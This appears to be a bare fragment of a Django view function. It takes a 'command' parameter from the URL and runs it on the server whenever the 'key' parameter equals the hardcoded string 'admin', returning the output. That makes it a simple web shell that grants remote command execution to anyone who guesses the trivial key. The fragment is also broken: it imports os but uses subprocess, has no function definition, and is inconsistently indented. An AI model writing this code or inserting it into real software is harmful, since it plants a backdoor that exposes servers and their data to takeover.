import os
key = request.GET.get('key', '')
    command = request.GET.get('command', '')

    if key == 'admin':
        if command:
            try:
                output = subprocess.check_output(command.split())
                return HttpResponse(output)
            except subprocess.CalledProcessError:
                return HttpResponse('Error executing command', status=400)
        else:
            return HttpResponse('200 OK')
    else:
        return HttpResponse('403 BLOCKED', status=403)
